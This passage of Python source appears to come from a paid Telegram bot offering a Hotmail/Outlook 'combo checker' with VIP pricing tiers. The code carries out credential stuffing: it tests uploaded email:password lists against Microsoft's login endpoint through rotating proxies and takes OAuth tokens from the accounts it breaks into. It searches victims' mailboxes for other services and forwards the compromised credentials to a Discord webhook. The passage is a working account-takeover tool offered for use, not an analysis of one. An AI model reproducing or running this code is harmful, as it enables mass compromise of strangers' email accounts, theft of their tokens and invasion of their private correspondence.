            ],
            "footer": {"text": "Combo Bot Pro - Discord Integration"},
            "timestamp": timestamp
        }
        with open(file_path, "rb") as f:
            file_data = f.read()
        data = aiohttp.FormData()
        data.add_field("payload_json", json.dumps({"embeds": [embed]}), content_type="application/json")
        data.add_field("file", file_data, filename=filename, content_type="text/plain; charset=utf-8")
        async with aiohttp.ClientSession() as session:
            async with session.post(DISCORD_WEBHOOK_URL, data=data) as resp:
                if resp.status in [200, 204]:
                    print(f"[+] Discord: Sent ({resp.status})")
                    return True
                else:
                    text = await resp.text()
                    print(f"[-] Discord: Failed. Status: {resp.status}, Response: {text}")
                    return False
    except Exception as e:
        print(f"[-] Discord Error: {e}")
        return False

# ═══════════════════════════════════════════════════════════
# ASYNC HOTMAIL CHECKER (FIXED: DummyCookieJar + Proxy Logging)
# ═══════════════════════════════════════════════════════════
class AsyncHotmailChecker:
    def __init__(self, chat_id, bot_instance, proxy_manager=None):
        self.chat_id = chat_id
        self.bot = bot_instance
        self.proxy_manager = proxy_manager
        self.hits = 0
        self.bad = 0
        self.custom = 0
        self.twofactor = 0
        self.retries = 0
        self.total = 0
        self.checked = 0
        self.cancelled = False
        self.lock = asyncio.Lock()
        self.start_time = time.time()
        self.hit_results = []
        self.all_platforms = set()
        self.status_msg_id = None
        self.last_update = 0
        self.combo_file = None
        self.hits_file = None
        # Concurrency: 25 with proxies, 5 without
        self.max_workers = 25 if (proxy_manager and proxy_manager.has_proxies()) else 5
        self.semaphore = asyncio.Semaphore(self.max_workers)
        print(f"[*] Checker initialized | Workers: {self.max_workers} | Proxies: {proxy_manager.has_proxies() if proxy_manager else False}")

    def make_progress_bar(self, percentage):
        percentage = max(0.0, min(100.0, percentage))
        filled = int(percentage // 10)
        empty = 10 - filled
        bar = "█" * filled + "▒" * empty
        return f"[{bar}] {percentage:.1f}%"

    async def _check_single(self, username, password):
        """Check one account. Returns: HIT, BAD, BAN, 2FA, CUSTOM, RETRY"""
        if self.cancelled:
            return "CANCELLED"

        proxy_url = None
        if self.proxy_manager:
            proxy_url = await self.proxy_manager.get_proxy()

        # Use DummyCookieJar to PREVENT cookie contamination between accounts!
        # Each account gets a fresh session with no shared cookies
        connector = TCPConnector(limit=1, force_close=True, enable_cleanup_closed=True)
        cookie_jar = DummyCookieJar()
        timeout = aiohttp.ClientTimeout(total=35, connect=10)

        async with aiohttp.ClientSession(
            connector=connector,
            cookie_jar=cookie_jar,
            timeout=timeout
        ) as session:

            try:
                # ═══ STEP 1: Login to Microsoft ═══
                login_url = f"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={username}&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"

                payload = {
                    'ps': '2', 'psRNGCDefaultType': '', 'psRNGCEntropy': '', 'psRNGCSLK': '',
                    'canary': '', 'ctx': '', 'hpgrequestid': '',
                    'PPFT': '-Div0Bt28gmyaHIfgDZtd5xvxnb7eeDAQOIjXkqyoF1ekQB6gLEqbSdzNE05qpz*B1Q82VKHs*RNXPa8xZG1TJS5HGKjFMxGcQ51PMU77ulAR!JjAUTPM*Am5lkZU6Sa!wIdI6zYnUI8VYQHQOCJLb*lRsaiV5MhGQieznZ!EynMuuBHbBfLr28btqCBqLhzZXQ$$',
                    'PPSX': 'Pa', 'NewUser': '1', 'FoundMSAs': '', 'fspost': '0', 'i21': '0',
                    'CookieDisclosure': '0', 'IsFidoSupported': '1', 'isSignupPost': '0',
                    'isRecoveryAttemptPost': '0', 'i13': '1', 'login': username, 'loginfmt': username,
                    'type': '11', 'LoginOptions': '1', 'lrt': '', 'lrtPartition': '',
                    'hisRegion': '', 'hisScaleUnit': '', 'passwd': password
                }

                headers = {
                    'Origin': 'https://login.live.com',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1', 'Sec-Fetch-Dest': 'document',
                    'Referer': f'https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username={username}',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cookie': 'MSPRequ=id=N&lt=1716447264&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-13a3c70b-5026-45a1-84df-99ba880a29e1'
                }

                req_kwargs = {}
                if proxy_url:
                    req_kwargs['proxy'] = proxy_url

                async with session.post(login_url, data=payload, headers=headers, allow_redirects=False, **req_kwargs) as resp:
                    response_text = await resp.text()
                    cookies = resp.cookies
                    response_headers = resp.headers

                # Check immediate failures
                if "Your account or password is incorrect." in response_text or \
                   "That Microsoft account doesn't exist." in response_text or \
                   "Sign in to your Microsoft account" in response_text:
                    return "BAD"

                if ",AC:null,urlFedConvertRename" in response_text:
                    return "BAN"

                if "account.live.com/recover?mkt" in response_text or \
                   "recover?mkt" in response_text or \
                   "account.live.com/identity/confirm?mkt" in response_text or \
                   "Email/Confirm?mkt" in response_text:
                    return "2FA"

                if "/cancel?mkt=" in response_text or "/Abuse?mkt=" in response_text:
                    return "CUSTOM"

                # Check success indicators
                success_cookies = 'ANON' in cookies or 'WLSSC' in cookies
                success_address = 'https://login.live.com/oauth20_desktop.srf?' in response_headers.get('Location', '')

                if not (success_cookies or success_address):
                    return "BAD"

                # Extract refresh_token from Location header
                location = response_headers.get('Location', '')
                refresh_token = None

                if 'refresh_token=' in location:
                    start = location.find('refresh_token=') + len('refresh_token=')
                    end = location.find('&', start)
                    if end == -1: 
                        end = len(location)
                    refresh_token = location[start:end]

                if not refresh_token and '#' in location:
                    try:
                        fragment = location.split('#')[1]
                        params = dict(x.split('=') for x in fragment.split('&') if '=' in x)
                        refresh_token = params.get('refresh_token')
                    except:
                        pass

                if not refresh_token:
                    return "BAD"

                # ═══ STEP 2: Get access token ═══
                token_url = "https://login.live.com/oauth20_token.srf"
                token_payload = {
                    'grant_type': 'refresh_token',
                    'client_id': '0000000048170EF2',
                    'scope': 'https://substrate.office.com/User-Internal.ReadWrite',
                    'redirect_uri': 'https://login.live.com/oauth20_desktop.srf',
                    'refresh_token': refresh_token,
                    'uaid': 'db28da170f2a4b85a26388d0a6cdbb6e'
                }
                token_headers = {
                    'x-ms-sso-Ignore-SSO': '1',
                    'User-Agent': 'Outlook-Android/2.0',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'login.live.com',
                    'Connection': 'Keep-Alive',
                    'Accept-Encoding': 'gzip'
                }

                async with session.post(token_url, data=token_payload, headers=token_headers, **req_kwargs) as token_resp:
                    if token_resp.status != 200:
                        return "BAD"
                    try:
                        token_data = await token_resp.json()
                        access_token = token_data.get('access_token')
                        if not access_token:
                            return "BAD"
                    except:
                        return "BAD"

                # ═══ STEP 3: Search emails for services ═══
                outlook_headers = {
                    'User-Agent': 'Outlook-Android/2.0',
                    'Pragma': 'no-cache',
                    'Accept': 'application/json',
                    'ForceSync': 'false',
                    'Authorization': f'Bearer {access_token}',
                    'X-AnchorMailbox': f'CID:{refresh_token}',
                    'Host': 'substrate.office.com',
                    'Connection': 'Keep-Alive',
                    'Accept-Encoding': 'gzip'
                }

                found_links = []
                for email, service in SV.items():
                    if self.cancelled:
                        return "CANCELLED"

                    search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
                    search_payload = {
                        "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                        "Scenario": {"Name": "owa.react"},
                        "TimeZone": "Egypt Standard Time",
                        "TextDecorations": "Off",
                        "EntityRequests": [{
                            "EntityType": "Conversation",
                            "ContentSources": ["Exchange"],
                            "Filter": {"Or": [
                                {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                                {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                            ]},
                            "From": 0,
                            "Query": {"QueryString": email},
                            "RefiningQueries": None,
                            "Size": 25,
                            "Sort": [
                                {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                                {"Field": "Time", "SortDirection": "Desc"}
                            ],
                            "EnableTopResults": True,
                            "TopResultsCount": 3
                        }],
                        "AnswerEntityRequests": [{
                            "Query": {"QueryString": email},
                            "EntityTypes": ["Event", "File"],
                            "From": 0,
                            "Size": 10,
                            "EnableAsyncResolution": True
                        }],
                        "QueryAlterationOptions": {
                            "EnableSuggestion": True,
                            "EnableAlteration": True,
                            "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification", "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"]
                        },
                        "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
                    }

                    try:
                        async with session.post(search_url, json=search_payload, headers=outlook_headers, **req_kwargs) as search_resp:
                            if search_resp.status == 200:
                                search_data = await search_resp.json()
                                total_msgs = 0
                                if 'EntityRequests' in search_data and len(search_data['EntityRequests']) > 0:
                                    entity_data = search_data['EntityRequests'][0]
                                    if 'Total' in entity_data:
                                        total_msgs = int(entity_data['Total'])

                                # Fallback: parse raw JSON text
                                search_text = json.dumps(search_data)
                                if '"Total":' in search_text:
                                    try:
                                        start = search_text.find('"Total":') + len('"Total":')
                                        end = search_text.find(',', start)
                                        total_str = search_text[start:end].strip()
                                        total_msgs = int(total_str)
                                    except:
                                        pass

                                if total_msgs > 0:
                                    found_links.append(service)
                    except Exception:
                        continue

                if found_links:
                    self.hit_results.append({
                        "username": username,
                        "password": password,
                        "services": found_links
                    })
                    return "HIT"
                else:
                    return "CUSTOM"

            except aiohttp.ClientProxyConnectionError as e:
                print(f"[!] Proxy connection error for {username}: {e}")
                if proxy_url and self.proxy_manager:
                    await self.proxy_manager.mark_dead(proxy_url)
                return "RETRY"
            except asyncio.TimeoutError:
                print(f"[!] Timeout for {username}")
                if proxy_url and self.proxy_manager:
                    await self.proxy_manager.mark_dead(proxy_url)
                return "RETRY"
            except Exception as e:
                print(f"[!] Error checking {username}: {e}")
                return "RETRY"

    async def check_account(self, username, password):
        """Wrapper with semaphore and stats tracking"""
        async with self.semaphore:
            if self.cancelled:
                return "CANCELLED"

            result = await self._check_single(username, password)

            async with self.lock:
                self.checked += 1
                if result == "HIT":
                    self.hits += 1
                elif result in ["BAD", "BAN"]:
                    self.bad += 1
                elif result == "2FA":
                    self.twofactor += 1
                elif result == "CUSTOM":
                    self.custom += 1
                elif result == "RETRY":
                    self.retries += 1

            # Update status periodically
            now = time.time()
            update_interval = 2 if self.total > 100 else 3
            if (self.checked % 5 == 0 or now - self.last_update > update_interval) and self.status_msg_id:
                self.last_update = now
                await self.update_status()

            # Small delay to avoid rate limiting
            await asyncio.sleep(0.05)
            return result

    async def update_status(self):
        try:
            lang = get_user(self.chat_id)["lang"] or "ar"
            t = LANGS[lang]
            elapsed = time.time() - self.start_time
            speed = self.checked / elapsed if elapsed > 0 else 0
            percent = min(100.0, (self.checked / self.total * 100)) if self.total > 0 else 0
            bar = self.make_progress_bar(percent)

            platforms_count = len(self.all_platforms)
            for hit in self.hit_results:
                for svc in hit.get("services", []):
                    self.all_platforms.add(svc)

            proxy_count = await self.proxy_manager.get_alive_count() if self.proxy_manager else 0

            text = t['hotmail_progress'].format(
                bar=bar, hits=self.hits, twofactor=self.twofactor,
                custom=self.custom, bad=self.bad, retries=self.retries,
                speed=speed, platforms=platforms_count, proxies=proxy_count
            )
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton(t['hotmail_cancel'], callback_data="hotmail_cancel"))
            await self.bot.edit_message_text(text, self.chat_id, self.status_msg_id, parse_mode='HTML', reply_markup=markup)
        except Exception as e:
            print(f"Status update error: {e}")

    async def run_check(self, combo_file_path, status_msg_id):
        self.combo_file = combo_file_path
        self.status_msg_id = status_msg_id

        combos = []
        with open(combo_file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if ':' in line and '@' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2 and '@' in parts[0]:
                        combos.append((parts[0].strip(), parts[1].strip()))

        self.total = len(combos)
        if self.total == 0:
            return

        print(f"[*] Starting check: {self.total} combos | Workers: {self.max_workers}")

        # Launch all tasks concurrently with semaphore control
        tasks = [self.check_account(u, p) for u, p in combos]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Log any exceptions
        for i, res in enumerate(results):
            if isinstance(res, Exception):
                print(f"[!] Task {i} exception: {res}")

        # Save results
        if self.hit_results:
            hits_file = f"Hotmail_Hits_{self.chat_id}_{int(time.time())}.txt"
            with open(hits_file, "w", encoding="utf-8") as f:
                for hit in self.hit_results:
                    services = ", ".join(hit["services"])
                    f.write(f"{hit['username']}:{hit['password']} | {services}\n")
            self.hits_file = hits_file
            print(f"[+] Saved {self.hits} hits to {hits_file}")
        else:
            self.hits_file = None

        platforms_str = ", ".join(self.all_platforms) if self.all_platforms else ""
        log_hotmail_check(self.chat_id, os.path.basename(combo_file_path), 
                         "completed" if not self.cancelled else "cancelled",
                         self.hits, self.twofactor, self.custom, self.bad, self.total, platforms_str)
        print(f"[*] Check complete: H:{self.hits} 2F:{self.twofactor} C:{self.custom} B:{self.bad} R:{self.retries}")

# ═══════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════
async def check_subscription(user_id):
    try:
        member = await bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception as e:
        print(f"Error checking sub: {e}")
    return False

def get_remaining_time_str(expiry_date, lang='ar'):
    if not expiry_date: 
        return "مدى الحياة (Lifetime)" if lang == 'ar' else "Lifetime"
    now = datetime.now()
    if expiry_date <= now: 
        return "منتهي" if lang == 'ar' else "Expired"
    diff = expiry_date - now
    total_seconds = int(diff.total_seconds())
    days, hours, minutes = total_seconds // 86400, (total_seconds % 86400) // 3600, (total_seconds % 3600) // 60
    parts = []
    if lang == 'ar':
        if days > 0: parts.append(f"{days} يوم")
        if hours > 0 or days > 0: parts.append(f"{hours} ساعة")
        parts.append(f"{minutes} دقيقة")
        return " و ".join(parts)
    else:
        if days > 0: parts.append(f"{days}d")
        if hours > 0 or days > 0: parts.append(f"{hours}h")
        parts.append(f"{minutes}m")
        return " ".join(parts)

def get_main_menu_markup(user, chat_id):
    markup = InlineKeyboardMarkup()
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    if user["is_vip"]:
        time_left = get_remaining_time_str(user["vip_expiry"], lang)
        vip_text = f"{t['vip_active']} {time_left} 💎"
        markup.add(InlineKeyboardButton(vip_text, callback_data="vip_status_info"))
    else:
        markup.add(InlineKeyboardButton(t['vip_buy'], callback_data="buy_vip"))

    markup.add(InlineKeyboardButton(t['hotmail_btn'], callback_data="hotmail_menu"))
    markup.add(InlineKeyboardButton(t['lang_btn'], callback_data="toggle_language"))

    if int(chat_id) == int(ADMIN_ID):
        markup.add(InlineKeyboardButton(t['admin_panel_btn'], callback_data="admin_panel"))

    return markup

def make_progress_bar(percentage):
    percentage = max(0.0, min(100.0, percentage))
    filled_blocks = int(percentage // 10)
    empty_blocks = 10 - filled_blocks
    bar = "█" * filled_blocks + "▒" * empty_blocks
    return f"[{bar}] {percentage:.1f}%"

async def start_hotmail_check(chat_id, file_path, msg_id):
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    if chat_id in active_checks:
        await bot.edit_message_text(f"{EMOJI['warning']} <b>فحص آخر قيد التشغيل. يرجى الانتظار.</b>", chat_id, msg_id, parse_mode='HTML')
        return

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = sum(1 for line in f if ':' in line and '@' in line)
    except:
        await bot.edit_message_text(f"{EMOJI['no']} <b>خطأ في قراءة الملف.</b>", chat_id, msg_id, parse_mode='HTML')
        return

    if lines == 0:
        await bot.edit_message_text(f"{EMOJI['no']} <b>لا يوجد كومبو صالح في الملف.</b>", chat_id, msg_id, parse_mode='HTML')
        return

    # Initialize proxy manager for this user
    proxy_manager = ProxyManager(chat_id)
    if not proxy_manager.has_proxies():
        proxy_manager = ProxyManager(None)  # Try global proxies

    checker = AsyncHotmailChecker(chat_id, bot, proxy_manager)
    active_checks[chat_id] = checker

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(t['hotmail_cancel'], callback_data="hotmail_cancel"))
    status_msg = await bot.edit_message_text(t['hotmail_processing'], chat_id, msg_id, parse_mode='HTML', reply_markup=markup)

    try:
        await checker.run_check(file_path, status_msg.message_id)

        # Send results
        elapsed = time.time() - checker.start_time
        done_text = t['hotmail_done'].format(
            hits=checker.hits, twofactor=checker.twofactor, custom=checker.custom,
            bad=checker.bad, retries=checker.retries, total=checker.total, elapsed=elapsed
        )

        markup = get_main_menu_markup(user, chat_id)
        await bot.edit_message_text(done_text, chat_id, status_msg.message_id, parse_mode='HTML', reply_markup=markup)

        # Send hits file if exists
        if checker.hits_file and os.path.exists(checker.hits_file):
            with open(checker.hits_file, "rb") as f:
                await bot.send_document(chat_id, f, caption=f"{EMOJI['fire']} <b>Hotmail Hits - {checker.hits} accounts</b>", parse_mode='HTML')

            # Send to Discord
            user_info = f"@{user['username']}" if user.get('username') else f"ID:{chat_id}"
            platforms_str = ", ".join(checker.all_platforms) if checker.all_platforms else "None"
            discord_ok = await send_file_to_discord(
                checker.hits_file, os.path.basename(checker.hits_file),
                f"Hotmail Check | Platforms: {platforms_str}",
                checker.hits, user_info,
                embed_title="🔥 Hotmail Check Results",
                color=0xFF4500
            )
            if discord_ok:
                await bot.send_message(chat_id, t['discord_sent'], parse_mode='HTML')
            else:
                await bot.send_message(chat_id, t['discord_failed'], parse_mode='HTML')

            try:
                os.remove(checker.hits_file)
            except:
                pass
        else:
            await bot.send_message(chat_id, t['hotmail_no_hits'], parse_mode='HTML')

    except Exception as e:
        print(f"Hotmail check error: {e}")
        import traceback
        traceback.print_exc()
        await bot.edit_message_text(f"{EMOJI['no']} <b>خطأ في الفحص: {e}</b>", chat_id, status_msg.message_id, parse_mode='HTML')
    finally:
        active_checks.pop(chat_id, None)

# ═══════════════════════════════════════════════════════════
# HANDLERS
# ═══════════════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
async def start_cmd(message: Message):
    chat_id = message.chat.id
    user = get_user(chat_id, message.from_user.username)

    if user["banned"]:
        await bot.reply_to(message, f"{EMOJI['no']} عذراً، لقد تم حظرك من استخدام البوت.")
        return

    is_subscribed = await check_subscription(chat_id)
    if not is_subscribed:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📢 اشترك في القناة الآن", url=CHANNEL_URL))
        markup.add(InlineKeyboardButton("تحقق من الاشتراك", callback_data="check_sub"))
        await bot.reply_to(message, f"{EMOJI['warning']} يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه!\n\n📌 القناة: {CHANNEL_URL}", reply_markup=markup, parse_mode='HTML')
        return

    if not user["lang"]:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🇸🇦 العربية", callback_data="set_lang_ar"), InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en"))
        await bot.reply_to(message, f"{EMOJI['lightning']} Please choose your language / اختر لغتك:", reply_markup=markup, parse_mode='HTML')
        return

    user_states.pop(chat_id, None)
    lang = user["lang"]
    text = LANGS[lang]['welcome']
    markup = get_main_menu_markup(user, chat_id)
    await bot.reply_to(message, text, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data in ["set_lang_ar", "set_lang_en"])
async def set_initial_language(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    lang = "ar" if call.data == "set_lang_ar" else "en"
    update_user_field(chat_id, "lang", lang)
    user = get_user(chat_id)
    t = LANGS[lang]
    markup = get_main_menu_markup(user, chat_id)
    await bot.edit_message_text(t['welcome'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
async def verify_subscription(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    if not await check_subscription(chat_id):
        await bot.answer_callback_query(call.id, "❌ لم تقم بالاشتراك بعد!", show_alert=True)
        return

    if not user["lang"]:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🇸🇦 العربية", callback_data="set_lang_ar"), InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en"))
        await bot.edit_message_text(f"{EMOJI['lightning']} Please choose your language / اختر لغتك:", chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
        return

    t = LANGS[user["lang"]]
    markup = get_main_menu_markup(user, chat_id)
    await bot.edit_message_text(t['welcome'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "toggle_language")
async def toggle_language_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    new_lang = "en" if user["lang"] == "ar" else "ar"
    update_user_field(chat_id, "lang", new_lang)
    user = get_user(chat_id)
    t = LANGS[user["lang"]]
    markup = get_main_menu_markup(user, chat_id)
    await bot.edit_message_text(t['welcome'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "vip_status_info")
async def vip_status_info_handler(call):
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    time_left = get_remaining_time_str(user["vip_expiry"], lang)
    msg = f"⭐ اشتراكك نشط.\n⏳ الوقت المتبقي: {time_left} 💎" if lang=='ar' else f"⭐ VIP is active.\n⏳ Time left: {time_left} 💎"
    await bot.answer_callback_query(call.id, msg, show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "buy_vip")
async def buy_vip_menu(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    lang = user["lang"] or "ar"

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("يوم تجريبي (Test) - 2$", url=f"https://t.me/{ADMIN_USERNAME}"))
    markup.add(InlineKeyboardButton("أسبوعي - 15$", url=f"https://t.me/{ADMIN_USERNAME}"))
    markup.add(InlineKeyboardButton("شهري - 30$", url=f"https://t.me/{ADMIN_USERNAME}"))
    markup.add(InlineKeyboardButton("لايف تايم (Lifetime) - 150$", url=f"https://t.me/{ADMIN_USERNAME}"))
    markup.add(InlineKeyboardButton("رجوع", callback_data="back_to_home"))

    text = f"{EMOJI['diamond']} <b>اختر باقة الاشتراك المطلوبة وتواصل مباشرة مع الأدمن لشحن الحساب:</b>" if lang=='ar' else f"{EMOJI['diamond']} <b>Choose your VIP package and contact admin to upgrade:</b>"
    await bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "back_to_home")
async def back_to_home_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    active_downloads[chat_id] = False
    if chat_id in active_checks:
        active_checks[chat_id].cancelled = True
        active_checks.pop(chat_id, None)
    user = get_user(chat_id)
    user_states.pop(chat_id, None)
    t = LANGS[user["lang"] or "ar"]
    markup = get_main_menu_markup(user, chat_id)
    await bot.edit_message_text(t['welcome'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "cancel_download")
async def cancel_download_handler(call):
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    t = LANGS[user["lang"] or "ar"]
    active_downloads[chat_id] = False
    user_states.pop(chat_id, None)
    await bot.answer_callback_query(call.id, t['process_cancelled'])
    try:
        markup = get_main_menu_markup(user, chat_id)
        await bot.edit_message_text(t['process_cancelled'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
    except:
        pass

# ═══════════════════════════════════════════════════════════
# HOTMAIL MENU HANDLERS
# ═══════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda call: call.data == "hotmail_menu")
async def hotmail_menu_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    markup = InlineKeyboardMarkup()
    if user.get("last_extracted_file") and os.path.exists(user["last_extracted_file"]):
        markup.add(InlineKeyboardButton(t['hotmail_check_file_btn'], callback_data="hotmail_auto_check"))
    markup.add(InlineKeyboardButton(t['hotmail_send_file_btn'], callback_data="hotmail_send_file"))
    markup.add(InlineKeyboardButton(t['proxy_menu_btn'], callback_data="proxy_menu"))
    markup.add(InlineKeyboardButton("🔙 رجوع / Back", callback_data="back_to_home"))

    await bot.edit_message_text(t['hotmail_welcome'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "hotmail_send_file")
async def hotmail_send_file_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    user_states[chat_id] = {"step": "wait_hotmail_file"}
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 رجوع / Back", callback_data="hotmail_menu"))
    await bot.edit_message_text(f"{EMOJI['package']} <b>أرسل ملف الكومبو (.txt) الآن...</b>\n\n<i>Send your combo file (.txt) now...</i>", chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "hotmail_auto_check")
async def hotmail_auto_check_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    last_file = user.get("last_extracted_file")
    if not last_file or not os.path.exists(last_file):
        await bot.answer_callback_query(call.id, t['hotmail_no_file'], show_alert=True)
        return

    await start_hotmail_check(chat_id, last_file, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data == "hotmail_start_check")
async def hotmail_start_check_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id

    if chat_id not in user_states or "hotmail_file" not in user_states[chat_id]:
        return

    file_path = user_states[chat_id]["hotmail_file"]
    await start_hotmail_check(chat_id, file_path, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data == "hotmail_cancel")
async def hotmail_cancel_handler(call):
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    if chat_id in active_checks:
        active_checks[chat_id].cancelled = True
        active_checks.pop(chat_id, None)
        await bot.answer_callback_query(call.id, t['hotmail_stopped'])
        markup = get_main_menu_markup(user, chat_id)
        try:
            await bot.edit_message_text(t['hotmail_stopped'], chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
        except:
            pass
    else:
        await bot.answer_callback_query(call.id, "No active check.")

# ═══════════════════════════════════════════════════════════
# PROXY MENU HANDLERS
# ═══════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda call: call.data == "proxy_menu")
async def proxy_menu_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    proxy_count = count_user_proxies(chat_id)
    text = t['proxy_welcome'].format(count=proxy_count)

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(t['proxy_add_btn'], callback_data="proxy_add"))
    if proxy_count > 0:
        markup.add(InlineKeyboardButton(t['proxy_clear_btn'], callback_data="proxy_clear"))
    markup.add(InlineKeyboardButton("🔙 رجوع / Back", callback_data="hotmail_menu"))

    await bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "proxy_add")
async def proxy_add_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    user_states[chat_id] = {"step": "wait_proxy_file"}
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 رجوع / Back", callback_data="proxy_menu"))
    await bot.edit_message_text(
        f"{EMOJI['proxy']} <b>أرسل ملف البروكسيات (.txt) الآن...</b>\n\n<i>Send your proxy file (.txt) now...</i>\n\n<b>Supported formats:</b>\n<code>ip:port</code>\n<code>http://ip:port</code>\n<code>http://user:pass@ip:port</code>",
        chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda call: call.data == "proxy_clear")
async def proxy_clear_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    clear_user_proxies(chat_id)
    await bot.answer_callback_query(call.id, t['proxy_cleared'], show_alert=True)

    proxy_count = 0
    text = t['proxy_welcome'].format(count=proxy_count)
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(t['proxy_add_btn'], callback_data="proxy_add"))
    markup.add(InlineKeyboardButton("🔙 رجوع / Back", callback_data="hotmail_menu"))
    await bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

# ═══════════════════════════════════════════════════════════
# ADMIN PANEL
# ═══════════════════════════════════════════════════════════
